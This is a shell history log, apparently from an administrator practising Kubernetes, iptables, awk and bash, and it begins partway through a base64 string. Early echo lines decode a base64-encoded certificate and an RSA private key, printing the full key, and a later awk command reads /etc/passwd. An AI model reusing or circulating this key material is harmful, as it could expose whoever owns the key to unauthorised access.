rc04KRnFmYzdtY1lzeVpiTUF3R0ExVWRFd1FGTUFNQkFmOHdEUVlKS29aSWh2Y05BUUVMQlFBRGdnRUJBR3c4TjVqVQpPZ0tnRDVoWGJFUjVkby9jWjR5UVNyZ2hheWMwc3A4dm00SGN6dzVIeERkalRTL3NJU1RmWGV6TE8rYzZVaC9wClR3dlhaSmViS1NHeDZsUy93WWVGYUpmSVRFQ0tRQVhyemNLeTNIMEljYWhSbWRLc0pGeUJCNHhiSXlVWFNqckgKMFNSdmtza2h2cndta3hRZG1oWlAyRHFwaGtoZXE5MHpXY2JLWGtIWks3MlpUd0NDYUJEaUZEVEdFeHpXQW1kZwpaUFVwTFBJMjJWMXV5LzZyNTRscnN5QVRLblZFYkZldDA3cjQyeXM2b2EzZmF4ZTdldkNLTmJnOU9Zd29pS2hmClBxYUpIMUVsYVhITDZCbUJIYURwZUpuaGVuRi9kWVZreDJIeU11SW92cDQ2UHk3d2RjYXhLL0U5UUpJcUwzSEMKcWJzd3ZubTg0d09sSWZNPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
echo  LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURsekNDQW4rZ0F3SUJBZ0lKQVBUQzNlLzJyRUlETUEwR0NTcUdTSWIzRFFFQkN3VUFNR0l4Q3pBSkJnTlYKQkFZVEFrTk9NUkF3RGdZRFZRUUlEQWRDWldscWFXNW5NUkF3RGdZRFZRUUhEQWRDWldscWFXNW5NUTh3RFFZRApWUVFLREFaRVpYWlBjSE14SGpBY0JnTlZCQU1NRlhSdmJXTmhkQzUzYjJoaGIzTm9kV0ZwTG1OdmJUQWVGdzB5Ck1EQXpNamd3TURReU16bGFGdzB5TURBME1qY3dNRFF5TXpsYU1HSXhDekFKQmdOVkJBWVRBa05PTVJBd0RnWUQKVlFRSURBZENaV2xxYVc1bk1SQXdEZ1lEVlFRSERBZENaV2xxYVc1bk1ROHdEUVlEVlFRS0RBWkVaWFpQY0hNeApIakFjQmdOVkJBTU1GWFJ2YldOaGRDNTNiMmhoYjNOb2RXRnBMbU52YlRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCCkJRQURnZ0VQQURDQ0FRb0NnZ0VCQU5sbFlpUys2c21razlWNjRZTnlkUUZUNTJiTE5LWngxazROMmQwM1J4L00KZ1lIazRIa1dsU1dNQ2dFYUF6ODlBUlJSbnpxamlIVld0UjdCbm9vRUExSVRab1dIZmxHNy8vcjF0TjBPZmpuQwpRQ2c2dkovSW4vdjFjRTVsRFd2TTBtU3J3YWREcE9EUWJDY2dYN092Z1dvUjJOYzBKK3IwY2RzRnh2Vi80N3o4ClNRY1NERU1UYzdkbHYzYlc1V1VRdkFlYmtreFNycmtZeWFRaVZsa0JST1RQaFVrelpRRFRUSnlsdlI2QjgzaWQKV0tVTWI4azdrVVNaMlVWelRVVWhDQy83Q1U5M3d1MkIrNEgvajJvc0pWYkZVeWkrc2hCMTlETnhZUThVcXdJVQorNHRnSUdOV3N2VXJwNzZ6dkRyYnlQWXVWVnZ2R2RkOEZiVzZQRE95TjZVQ0F3RUFBYU5RTUU0d0hRWURWUjBPCkJCWUVGRTlwOTVnelZlbWNTK3NORnFmYzdtY1lzeVpiTUI4R0ExVWRJd1FZTUJhQUZFOXA5NWd6VmVtY1Mrc04KRnFmYzdtY1lzeVpiTUF3R0ExVWRFd1FGTUFNQkFmOHdEUVlKS29aSWh2Y05BUUVMQlFBRGdnRUJBR3c4TjVqVQpPZ0tnRDVoWGJFUjVkby9jWjR5UVNyZ2hheWMwc3A4dm00SGN6dzVIeERkalRTL3NJU1RmWGV6TE8rYzZVaC9wClR3dlhaSmViS1NHeDZsUy93WWVGYUpmSVRFQ0tRQVhyemNLeTNIMEljYWhSbWRLc0pGeUJCNHhiSXlVWFNqckgKMFNSdmtza2h2cndta3hRZG1oWlAyRHFwaGtoZXE5MHpXY2JLWGtIWks3MlpUd0NDYUJEaUZEVEdFeHpXQW1kZwpaUFVwTFBJMjJWMXV5LzZyNTRscnN5QVRLblZFYkZldDA3cjQyeXM2b2EzZmF4ZTdldkNLTmJnOU9Zd29pS2hmClBxYUpIMUVsYVhITDZCbUJIYURwZUpuaGVuRi9kWVZreDJIeU11SW92cDQ2UHk3d2RjYXhLL0U5UUpJcUwzSEMKcWJzd3ZubTg0d09sSWZNPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg== |base
echo  LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURsekNDQW4rZ0F3SUJBZ0lKQVBUQzNlLzJyRUlETUEwR0NTcUdTSWIzRFFFQkN3VUFNR0l4Q3pBSkJnTlYKQkFZVEFrTk9NUkF3RGdZRFZRUUlEQWRDWldscWFXNW5NUkF3RGdZRFZRUUhEQWRDWldscWFXNW5NUTh3RFFZRApWUVFLREFaRVpYWlBjSE14SGpBY0JnTlZCQU1NRlhSdmJXTmhkQzUzYjJoaGIzTm9kV0ZwTG1OdmJUQWVGdzB5Ck1EQXpNamd3TURReU16bGFGdzB5TURBME1qY3dNRFF5TXpsYU1HSXhDekFKQmdOVkJBWVRBa05PTVJBd0RnWUQKVlFRSURBZENaV2xxYVc1bk1SQXdEZ1lEVlFRSERBZENaV2xxYVc1bk1ROHdEUVlEVlFRS0RBWkVaWFpQY0hNeApIakFjQmdOVkJBTU1GWFJ2YldOaGRDNTNiMmhoYjNOb2RXRnBMbU52YlRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCCkJRQURnZ0VQQURDQ0FRb0NnZ0VCQU5sbFlpUys2c21razlWNjRZTnlkUUZUNTJiTE5LWngxazROMmQwM1J4L00KZ1lIazRIa1dsU1dNQ2dFYUF6ODlBUlJSbnpxamlIVld0UjdCbm9vRUExSVRab1dIZmxHNy8vcjF0TjBPZmpuQwpRQ2c2dkovSW4vdjFjRTVsRFd2TTBtU3J3YWREcE9EUWJDY2dYN092Z1dvUjJOYzBKK3IwY2RzRnh2Vi80N3o4ClNRY1NERU1UYzdkbHYzYlc1V1VRdkFlYmtreFNycmtZeWFRaVZsa0JST1RQaFVrelpRRFRUSnlsdlI2QjgzaWQKV0tVTWI4azdrVVNaMlVWelRVVWhDQy83Q1U5M3d1MkIrNEgvajJvc0pWYkZVeWkrc2hCMTlETnhZUThVcXdJVQorNHRnSUdOV3N2VXJwNzZ6dkRyYnlQWXVWVnZ2R2RkOEZiVzZQRE95TjZVQ0F3RUFBYU5RTUU0d0hRWURWUjBPCkJCWUVGRTlwOTVnelZlbWNTK3NORnFmYzdtY1lzeVpiTUI4R0ExVWRJd1FZTUJhQUZFOXA5NWd6VmVtY1Mrc04KRnFmYzdtY1lzeVpiTUF3R0ExVWRFd1FGTUFNQkFmOHdEUVlKS29aSWh2Y05BUUVMQlFBRGdnRUJBR3c4TjVqVQpPZ0tnRDVoWGJFUjVkby9jWjR5UVNyZ2hheWMwc3A4dm00SGN6dzVIeERkalRTL3NJU1RmWGV6TE8rYzZVaC9wClR3dlhaSmViS1NHeDZsUy93WWVGYUpmSVRFQ0tRQVhyemNLeTNIMEljYWhSbWRLc0pGeUJCNHhiSXlVWFNqckgKMFNSdmtza2h2cndta3hRZG1oWlAyRHFwaGtoZXE5MHpXY2JLWGtIWks3MlpUd0NDYUJEaUZEVEdFeHpXQW1kZwpaUFVwTFBJMjJWMXV5LzZyNTRscnN5QVRLblZFYkZldDA3cjQyeXM2b2EzZmF4ZTdldkNLTmJnOU9Zd29pS2hmClBxYUpIMUVsYVhITDZCbUJIYURwZUpuaGVuRi9kWVZreDJIeU11SW92cDQ2UHk3d2RjYXhLL0U5UUpJcUwzSEMKcWJzd3ZubTg0d09sSWZNPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg== |base64 -d
echo  LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBMldWaUpMN3F5YVNUMVhyaGczSjFBVlBuWnNzMHBuSFdUZzNaM1RkSEg4eUJnZVRnCmVSYVZKWXdLQVJvRFB6MEJGRkdmT3FPSWRWYTFIc0dlaWdRRFVoTm1oWWQrVWJ2Lyt2VzAzUTUrT2NKQUtEcTgKbjhpZisvVndUbVVOYTh6U1pLdkJwME9rNE5Cc0p5QmZzNitCYWhIWTF6UW42dlJ4MndYRzlYL2p2UHhKQnhJTQpReE56dDJXL2R0YmxaUkM4QjV1U1RGS3V1UmpKcENKV1dRRkU1TStGU1RObEFOTk1uS1c5SG9IemVKMVlwUXh2CnlUdVJSSm5aUlhOTlJTRUlML3NKVDNmQzdZSDdnZitQYWl3bFZzVlRLTDZ5RUhYME0zRmhEeFNyQWhUN2kyQWcKWTFheTlTdW52ck84T3R2STlpNVZXKzhaMTN3VnRibzhNN0kzcFFJREFRQUJBb0lCQVFEUm1CWjhXUGtpZWFMeQpNbXZVQUhqZ1U5V0kzS2VoUmFXWlVXOVlBV0I0UHdJcGl0SUV6SW4xVGtPaTlrSmxLTnF1alZjWUFPeWlQSHVZCjhKRjZmUTM2aHF2VVYyS3BTTGt1YXMvNlJHdmNJZlViRkM0aFd4c3JuMkdzbzI3Q0hSSkhidlRnMzYzSjlnZ2YKM08ySDN0REZ3L2tzMnFNVnVxRSt5aDRkT1RVSFVPbks2am5iZkJ5VTViOWR3Nmx6dCtzUytrbW1hZW1IdHBTUQpkeXc2NDk0ZFBRK29kanR4VHN4UUN6R09qVitlR2o5ckJ6d2xEdUtSM2d4bGR6cXFSU01jOWduZWdpa2hDMW9FCmhnQ29oSTlzYzZ6d0cycDdZNUd1eG1Cd21oMEd6VzZ4NldBeVFjK1lkdHIrNGFmeW5TUFVyUnBacGJMeEI1NksKWGxtRzdtV05Bb0dCQVBIVmcxK0VNcWxLeEdSTnU1Mk5ZSW5lRmI0eElkTDNlR091NXV4T1JyMWg3bUVKNDAveQpPbDArUHJvaDdZY1VJbHJqd0Q2SHdCN2dJaG9qSVFHTG1uVjdmam8rbCtpRWF3eS9wcVZRZ1hhQmxWNWtBWDZNCkdHa2dXT2NyYWlmYzRjMVF3TUNyY3hsU1Z6Y0o3ZS9qRGppNEIxRVJPTzFvcFlLTkdzQ2ZSMnU3QW9HQkFPWWgKWjA1dUFpV3d4ZEhDeFhKY3l6WjdTMjBpMnF4U1lhaUFTcjhuUzhoMU4zNWZkM3IzK09vditpZXc2WmhvTjIvWAp3Y3dlWXg1WDF5b21td05tMTI3b3ByVUREdkU0Vys1WnVBZHBWQXM3dnJSU0YvMjBYbFZCZ0pqaFN5dnlmZ3MvCkFwalZ5em54d3R6UjZMbEJQRGtNbGVGa2RaU21NRlRncTlEekk4UWZBb0dBRVZVRklsNWVKeVgxcDE2dTJKN2UKVVdNNldiUTV3VjM5SWQvU0t4TjlIR3VkWXhVTFZwcDh0bHdVc05CbnJxdXh2cVBlRGwwNlZyd25sWW40L3B4Ygp5Sm0rTlR4eE5MZncyQ3dRTEg3MW1HRzNLOW10QmIzU3JnNGtjUVQ2aWJyWjhCWWVpbkIvUWt4VmRkdGZVemNKCnVPVHZtVTdMcnJBMlZJSDZiZDI4aDZzQ2dZRUF1dXNnekx4ZnRCdHI0ZDl3bmw0dWxKYjZnYStRcSt6Ujg1b1kKbkVDZnRqYzNGc2NWOWVSWjRtV0xxeGR2OU9HWlBaZWlpbGVZTEhvdWdzY09tMm01ekJUZDZ5S0x6WFA0ZjVXUgorenNiRDNDOGlod3Y3bHJGVUR3KzVtMy9yN2RybDFqYmxDWDZ4cHJPcXFzNGV0ZzR3U0d1ejM3WVhoL0tHL2JNCnQ0LzFXZ01DZ1lCSDAxaXNsN3BqUjgxUGdRRWs2eDFLZi82U1RyTzh1Qm9MamRPS1BRemxqUVdJZmhxOWpCdVMKTk1ZcVhPeGRTOUJ1ZGIyV2J4UzdKVk5yYmk3VTc1OU0zY0EvWEpsdHpQd3JVNXhWWTdUaWlsRWRGYzhOcU9GUQplbk1SRGZ0c1gzNUVoUDk5QXo0bVI4VXFJZkFLQzB3U2MyNU53aTkxbXNLaERqTEpadlY0N1E9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
echo  LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBMldWaUpMN3F5YVNUMVhyaGczSjFBVlBuWnNzMHBuSFdUZzNaM1RkSEg4eUJnZVRnCmVSYVZKWXdLQVJvRFB6MEJGRkdmT3FPSWRWYTFIc0dlaWdRRFVoTm1oWWQrVWJ2Lyt2VzAzUTUrT2NKQUtEcTgKbjhpZisvVndUbVVOYTh6U1pLdkJwME9rNE5Cc0p5QmZzNitCYWhIWTF6UW42dlJ4MndYRzlYL2p2UHhKQnhJTQpReE56dDJXL2R0YmxaUkM4QjV1U1RGS3V1UmpKcENKV1dRRkU1TStGU1RObEFOTk1uS1c5SG9IemVKMVlwUXh2CnlUdVJSSm5aUlhOTlJTRUlML3NKVDNmQzdZSDdnZitQYWl3bFZzVlRLTDZ5RUhYME0zRmhEeFNyQWhUN2kyQWcKWTFheTlTdW52ck84T3R2STlpNVZXKzhaMTN3VnRibzhNN0kzcFFJREFRQUJBb0lCQVFEUm1CWjhXUGtpZWFMeQpNbXZVQUhqZ1U5V0kzS2VoUmFXWlVXOVlBV0I0UHdJcGl0SUV6SW4xVGtPaTlrSmxLTnF1alZjWUFPeWlQSHVZCjhKRjZmUTM2aHF2VVYyS3BTTGt1YXMvNlJHdmNJZlViRkM0aFd4c3JuMkdzbzI3Q0hSSkhidlRnMzYzSjlnZ2YKM08ySDN0REZ3L2tzMnFNVnVxRSt5aDRkT1RVSFVPbks2am5iZkJ5VTViOWR3Nmx6dCtzUytrbW1hZW1IdHBTUQpkeXc2NDk0ZFBRK29kanR4VHN4UUN6R09qVitlR2o5ckJ6d2xEdUtSM2d4bGR6cXFSU01jOWduZWdpa2hDMW9FCmhnQ29oSTlzYzZ6d0cycDdZNUd1eG1Cd21oMEd6VzZ4NldBeVFjK1lkdHIrNGFmeW5TUFVyUnBacGJMeEI1NksKWGxtRzdtV05Bb0dCQVBIVmcxK0VNcWxLeEdSTnU1Mk5ZSW5lRmI0eElkTDNlR091NXV4T1JyMWg3bUVKNDAveQpPbDArUHJvaDdZY1VJbHJqd0Q2SHdCN2dJaG9qSVFHTG1uVjdmam8rbCtpRWF3eS9wcVZRZ1hhQmxWNWtBWDZNCkdHa2dXT2NyYWlmYzRjMVF3TUNyY3hsU1Z6Y0o3ZS9qRGppNEIxRVJPTzFvcFlLTkdzQ2ZSMnU3QW9HQkFPWWgKWjA1dUFpV3d4ZEhDeFhKY3l6WjdTMjBpMnF4U1lhaUFTcjhuUzhoMU4zNWZkM3IzK09vditpZXc2WmhvTjIvWAp3Y3dlWXg1WDF5b21td05tMTI3b3ByVUREdkU0Vys1WnVBZHBWQXM3dnJSU0YvMjBYbFZCZ0pqaFN5dnlmZ3MvCkFwalZ5em54d3R6UjZMbEJQRGtNbGVGa2RaU21NRlRncTlEekk4UWZBb0dBRVZVRklsNWVKeVgxcDE2dTJKN2UKVVdNNldiUTV3VjM5SWQvU0t4TjlIR3VkWXhVTFZwcDh0bHdVc05CbnJxdXh2cVBlRGwwNlZyd25sWW40L3B4Ygp5Sm0rTlR4eE5MZncyQ3dRTEg3MW1HRzNLOW10QmIzU3JnNGtjUVQ2aWJyWjhCWWVpbkIvUWt4VmRkdGZVemNKCnVPVHZtVTdMcnJBMlZJSDZiZDI4aDZzQ2dZRUF1dXNnekx4ZnRCdHI0ZDl3bmw0dWxKYjZnYStRcSt6Ujg1b1kKbkVDZnRqYzNGc2NWOWVSWjRtV0xxeGR2OU9HWlBaZWlpbGVZTEhvdWdzY09tMm01ekJUZDZ5S0x6WFA0ZjVXUgorenNiRDNDOGlod3Y3bHJGVUR3KzVtMy9yN2RybDFqYmxDWDZ4cHJPcXFzNGV0ZzR3U0d1ejM3WVhoL0tHL2JNCnQ0LzFXZ01DZ1lCSDAxaXNsN3BqUjgxUGdRRWs2eDFLZi82U1RyTzh1Qm9MamRPS1BRemxqUVdJZmhxOWpCdVMKTk1ZcVhPeGRTOUJ1ZGIyV2J4UzdKVk5yYmk3VTc1OU0zY0EvWEpsdHpQd3JVNXhWWTdUaWlsRWRGYzhOcU9GUQplbk1SRGZ0c1gzNUVoUDk5QXo0bVI4VXFJZkFLQzB3U2MyNU53aTkxbXNLaERqTEpadlY0N1E9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo= |base 
echo  LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBMldWaUpMN3F5YVNUMVhyaGczSjFBVlBuWnNzMHBuSFdUZzNaM1RkSEg4eUJnZVRnCmVSYVZKWXdLQVJvRFB6MEJGRkdmT3FPSWRWYTFIc0dlaWdRRFVoTm1oWWQrVWJ2Lyt2VzAzUTUrT2NKQUtEcTgKbjhpZisvVndUbVVOYTh6U1pLdkJwME9rNE5Cc0p5QmZzNitCYWhIWTF6UW42dlJ4MndYRzlYL2p2UHhKQnhJTQpReE56dDJXL2R0YmxaUkM4QjV1U1RGS3V1UmpKcENKV1dRRkU1TStGU1RObEFOTk1uS1c5SG9IemVKMVlwUXh2CnlUdVJSSm5aUlhOTlJTRUlML3NKVDNmQzdZSDdnZitQYWl3bFZzVlRLTDZ5RUhYME0zRmhEeFNyQWhUN2kyQWcKWTFheTlTdW52ck84T3R2STlpNVZXKzhaMTN3VnRibzhNN0kzcFFJREFRQUJBb0lCQVFEUm1CWjhXUGtpZWFMeQpNbXZVQUhqZ1U5V0kzS2VoUmFXWlVXOVlBV0I0UHdJcGl0SUV6SW4xVGtPaTlrSmxLTnF1alZjWUFPeWlQSHVZCjhKRjZmUTM2aHF2VVYyS3BTTGt1YXMvNlJHdmNJZlViRkM0aFd4c3JuMkdzbzI3Q0hSSkhidlRnMzYzSjlnZ2YKM08ySDN0REZ3L2tzMnFNVnVxRSt5aDRkT1RVSFVPbks2am5iZkJ5VTViOWR3Nmx6dCtzUytrbW1hZW1IdHBTUQpkeXc2NDk0ZFBRK29kanR4VHN4UUN6R09qVitlR2o5ckJ6d2xEdUtSM2d4bGR6cXFSU01jOWduZWdpa2hDMW9FCmhnQ29oSTlzYzZ6d0cycDdZNUd1eG1Cd21oMEd6VzZ4NldBeVFjK1lkdHIrNGFmeW5TUFVyUnBacGJMeEI1NksKWGxtRzdtV05Bb0dCQVBIVmcxK0VNcWxLeEdSTnU1Mk5ZSW5lRmI0eElkTDNlR091NXV4T1JyMWg3bUVKNDAveQpPbDArUHJvaDdZY1VJbHJqd0Q2SHdCN2dJaG9qSVFHTG1uVjdmam8rbCtpRWF3eS9wcVZRZ1hhQmxWNWtBWDZNCkdHa2dXT2NyYWlmYzRjMVF3TUNyY3hsU1Z6Y0o3ZS9qRGppNEIxRVJPTzFvcFlLTkdzQ2ZSMnU3QW9HQkFPWWgKWjA1dUFpV3d4ZEhDeFhKY3l6WjdTMjBpMnF4U1lhaUFTcjhuUzhoMU4zNWZkM3IzK09vditpZXc2WmhvTjIvWAp3Y3dlWXg1WDF5b21td05tMTI3b3ByVUREdkU0Vys1WnVBZHBWQXM3dnJSU0YvMjBYbFZCZ0pqaFN5dnlmZ3MvCkFwalZ5em54d3R6UjZMbEJQRGtNbGVGa2RaU21NRlRncTlEekk4UWZBb0dBRVZVRklsNWVKeVgxcDE2dTJKN2UKVVdNNldiUTV3VjM5SWQvU0t4TjlIR3VkWXhVTFZwcDh0bHdVc05CbnJxdXh2cVBlRGwwNlZyd25sWW40L3B4Ygp5Sm0rTlR4eE5MZncyQ3dRTEg3MW1HRzNLOW10QmIzU3JnNGtjUVQ2aWJyWjhCWWVpbkIvUWt4VmRkdGZVemNKCnVPVHZtVTdMcnJBMlZJSDZiZDI4aDZzQ2dZRUF1dXNnekx4ZnRCdHI0ZDl3bmw0dWxKYjZnYStRcSt6Ujg1b1kKbkVDZnRqYzNGc2NWOWVSWjRtV0xxeGR2OU9HWlBaZWlpbGVZTEhvdWdzY09tMm01ekJUZDZ5S0x6WFA0ZjVXUgorenNiRDNDOGlod3Y3bHJGVUR3KzVtMy9yN2RybDFqYmxDWDZ4cHJPcXFzNGV0ZzR3U0d1ejM3WVhoL0tHL2JNCnQ0LzFXZ01DZ1lCSDAxaXNsN3BqUjgxUGdRRWs2eDFLZi82U1RyTzh1Qm9MamRPS1BRemxqUVdJZmhxOWpCdVMKTk1ZcVhPeGRTOUJ1ZGIyV2J4UzdKVk5yYmk3VTc1OU0zY0EvWEpsdHpQd3JVNXhWWTdUaWlsRWRGYzhOcU9GUQplbk1SRGZ0c1gzNUVoUDk5QXo0bVI4VXFJZkFLQzB3U2MyNU53aTkxbXNLaERqTEpadlY0N1E9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo= |base64
echo  LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBMldWaUpMN3F5YVNUMVhyaGczSjFBVlBuWnNzMHBuSFdUZzNaM1RkSEg4eUJnZVRnCmVSYVZKWXdLQVJvRFB6MEJGRkdmT3FPSWRWYTFIc0dlaWdRRFVoTm1oWWQrVWJ2Lyt2VzAzUTUrT2NKQUtEcTgKbjhpZisvVndUbVVOYTh6U1pLdkJwME9rNE5Cc0p5QmZzNitCYWhIWTF6UW42dlJ4MndYRzlYL2p2UHhKQnhJTQpReE56dDJXL2R0YmxaUkM4QjV1U1RGS3V1UmpKcENKV1dRRkU1TStGU1RObEFOTk1uS1c5SG9IemVKMVlwUXh2CnlUdVJSSm5aUlhOTlJTRUlML3NKVDNmQzdZSDdnZitQYWl3bFZzVlRLTDZ5RUhYME0zRmhEeFNyQWhUN2kyQWcKWTFheTlTdW52ck84T3R2STlpNVZXKzhaMTN3VnRibzhNN0kzcFFJREFRQUJBb0lCQVFEUm1CWjhXUGtpZWFMeQpNbXZVQUhqZ1U5V0kzS2VoUmFXWlVXOVlBV0I0UHdJcGl0SUV6SW4xVGtPaTlrSmxLTnF1alZjWUFPeWlQSHVZCjhKRjZmUTM2aHF2VVYyS3BTTGt1YXMvNlJHdmNJZlViRkM0aFd4c3JuMkdzbzI3Q0hSSkhidlRnMzYzSjlnZ2YKM08ySDN0REZ3L2tzMnFNVnVxRSt5aDRkT1RVSFVPbks2am5iZkJ5VTViOWR3Nmx6dCtzUytrbW1hZW1IdHBTUQpkeXc2NDk0ZFBRK29kanR4VHN4UUN6R09qVitlR2o5ckJ6d2xEdUtSM2d4bGR6cXFSU01jOWduZWdpa2hDMW9FCmhnQ29oSTlzYzZ6d0cycDdZNUd1eG1Cd21oMEd6VzZ4NldBeVFjK1lkdHIrNGFmeW5TUFVyUnBacGJMeEI1NksKWGxtRzdtV05Bb0dCQVBIVmcxK0VNcWxLeEdSTnU1Mk5ZSW5lRmI0eElkTDNlR091NXV4T1JyMWg3bUVKNDAveQpPbDArUHJvaDdZY1VJbHJqd0Q2SHdCN2dJaG9qSVFHTG1uVjdmam8rbCtpRWF3eS9wcVZRZ1hhQmxWNWtBWDZNCkdHa2dXT2NyYWlmYzRjMVF3TUNyY3hsU1Z6Y0o3ZS9qRGppNEIxRVJPTzFvcFlLTkdzQ2ZSMnU3QW9HQkFPWWgKWjA1dUFpV3d4ZEhDeFhKY3l6WjdTMjBpMnF4U1lhaUFTcjhuUzhoMU4zNWZkM3IzK09vditpZXc2WmhvTjIvWAp3Y3dlWXg1WDF5b21td05tMTI3b3ByVUREdkU0Vys1WnVBZHBWQXM3dnJSU0YvMjBYbFZCZ0pqaFN5dnlmZ3MvCkFwalZ5em54d3R6UjZMbEJQRGtNbGVGa2RaU21NRlRncTlEekk4UWZBb0dBRVZVRklsNWVKeVgxcDE2dTJKN2UKVVdNNldiUTV3VjM5SWQvU0t4TjlIR3VkWXhVTFZwcDh0bHdVc05CbnJxdXh2cVBlRGwwNlZyd25sWW40L3B4Ygp5Sm0rTlR4eE5MZncyQ3dRTEg3MW1HRzNLOW10QmIzU3JnNGtjUVQ2aWJyWjhCWWVpbkIvUWt4VmRkdGZVemNKCnVPVHZtVTdMcnJBMlZJSDZiZDI4aDZzQ2dZRUF1dXNnekx4ZnRCdHI0ZDl3bmw0dWxKYjZnYStRcSt6Ujg1b1kKbkVDZnRqYzNGc2NWOWVSWjRtV0xxeGR2OU9HWlBaZWlpbGVZTEhvdWdzY09tMm01ekJUZDZ5S0x6WFA0ZjVXUgorenNiRDNDOGlod3Y3bHJGVUR3KzVtMy9yN2RybDFqYmxDWDZ4cHJPcXFzNGV0ZzR3U0d1ejM3WVhoL0tHL2JNCnQ0LzFXZ01DZ1lCSDAxaXNsN3BqUjgxUGdRRWs2eDFLZi82U1RyTzh1Qm9MamRPS1BRemxqUVdJZmhxOWpCdVMKTk1ZcVhPeGRTOUJ1ZGIyV2J4UzdKVk5yYmk3VTc1OU0zY0EvWEpsdHpQd3JVNXhWWTdUaWlsRWRGYzhOcU9GUQplbk1SRGZ0c1gzNUVoUDk5QXo0bVI4VXFJZkFLQzB3U2MyNU53aTkxbXNLaERqTEpadlY0N1E9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo= |base64 -d
cd manifests/
ls
cd configmap/
ls
cp pod-configmap-2.yaml pod-secret-1.yaml
vim pod-secret-1.yaml 
cp pod-configmap.yaml pod-secret-1.yaml
vim pod-secret-1.yaml 
kubectl apply- f pod-secret-1.yaml 
kubectl apply  -f pod-secret-1.yaml 
vim pod-secret-1.yaml 
kubectl apply  -f pod-secret-1.yaml 
vim pod-secret-1.yaml 
kubectl apply  -f pod-secret-1.yaml 
kubectl get pod
kubectl delete pod pod-secert-1
kubectl get pod
kubectl delete po pod-secert-1
kubectl get pod
kubectl describe po pod-secret-1
vim pod-secret-1.yaml 
kubectl get secret
kubectl apply  -f pod-secret-1.yaml 
kubectl delete -f pod-secret-1.yaml 
kubectl apply  -f pod-secret-1.yaml 
kubectl get po
kubectl exec -it pod-secret-1 -- printenv
cd ..
vim steteful-demo.yaml
kubectl get pvc
kubectl get po
kubectl delete pods/pod-cm-2 pods/pod-secret-1
kubectl delete deploy/myapp-deploy deploy/rediness-httpget-pod
kubectl delete deploy/myapp-deploy pods/rediness-httpget-pod
kubectl delete po readiness-httpget-pod
kubectl get pvc
cd volumes/
ls
vim pv-demo.yaml
kubectl get pv
kubectl apply -f pv-demo.yaml 
kubectl get pv
vim /etc/sysconfig/network-scripts/ifcfg-ens160 
iptables -L
getenforce
echo-request
echo - reply
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -L
iptables -L -n
iptables -A OUTPUT -p tcp --sport 22 -j DROP
ls
iptables -L
reboot
vim /etc/ssh/sshd_config 
iptables -L
iptables -A INPUT -p tcp --dport 22-j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -L
iptables -L -n
iptables -A OUTPUT -p tcp --sport 22 -j DROP
iptables -L -n
reboot
iptables -A INPUT -p tcp -dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT
reboot
ping 10.134.196.22
history |tail -50
history | grep mount
kubectl get po
ls
cd manifests/
ls
cd volumes/
ls
vim pod-hostpath-vol.yaml 
last
last |awk '{print $3}'|sort |uniq -c|sort -rn |head-10
last |awk '{print $3}'|sort |uniq -c|sort -rn |head -10
last|sort |uniq -c|sort -rn |head -10
-2-time=3
_2$3=3
trust_no_1=1
2004file=2
ip=$(ip addr|sed -nr 's#^.*inet (.*)/24.*$#\1#gp')
echo $ip
ip a
lsof
netstat -apn
pwd|echo
echo $(pwd
)
echo pwd
$pwd
echo $(pwd
)
arp --help
arp -L
arp -a
cat /proc/meminfo
top
ls
kubectl start po myapp-1
history |grep kubectl
kubectl describe myapp-0
kubectl describe po myapp-0
cd manifests/
ls
vim myapp-svc.yaml 
cd volumes/
ls
vim pod-demo-vol.yaml 
vim pv-demo.yaml 
kubectl delete pods/myapp-0
kubectl get po
l
cd
ls
vim ipvs.moudles 
ls
cd git/
ls
python hello.py 2>&1  1.txt 
ls
cd
ls
cd scripts01/
ls
vim readfd.sh 
sh readfd.sh 2>&1 shenme.txt
sh readfd.sh > shenme.txt 2>&1
ls
sh readfd.sh 2>& shenme.txt
sh readfd.sh 2&> shenme.txt
ls shenme.txt 
cat shenme.txt 
rm shenme.txt 
sh readfd.sh 2&> shenme.txt
cat shenme.txt 
awk 'BEGIN {Arr[2,79]=78 print Arr[2,79]}'
awk 'BEGIN { Arr[2,79]=78 print Arr[2,79] }'
awk 'BEGIN { Arr[2,79]=78 print Arr[ "2/03479"] }'
awk 'BEGIN { FS=":" } $1="root" { print $3 }' /etc/passwd
cat /etc/passwd |head -5
awk 'BEGIN { Arr[2,79]=78 }{ print Arr[ "2/03479"] }'
awk 'BEGIN { Arr[2,79]=78 } { print Arr[ "2/03479"] }'
awk 'BEGIN { Arr[2,79]=78 idx=2 SUBSEP 79; print Arr[idx] }'
ls -l shenme.txt 
umask
file shenme.txt 
chmod u s shenme.txt 
chmod u+s shenme.txt 
file shenme.txt 
ls -l shenme.txt 
chmod u+x shenme.txt 
ls -l shenme.txt 
pread
ls
cd scripts01/
ls
ll
cat unixbench.sh |tail +300
cat unixbench.sh |tail -n +300
cat unixbench.sh |tail -n +30
cat unixbench.sh |tail -n +30|head -n 20
cat unixbench.sh |tail -n -30
cat unixbench.sh |head -n +10
cat unixbench.sh |head -n -10
cat unixbench.sh |head -n 10
w unixbench.sh 
wc unixbench.sh 
cat unixbench.sh 
cat unixbench.sh |head -n -10
cat unixbench.sh |head -10
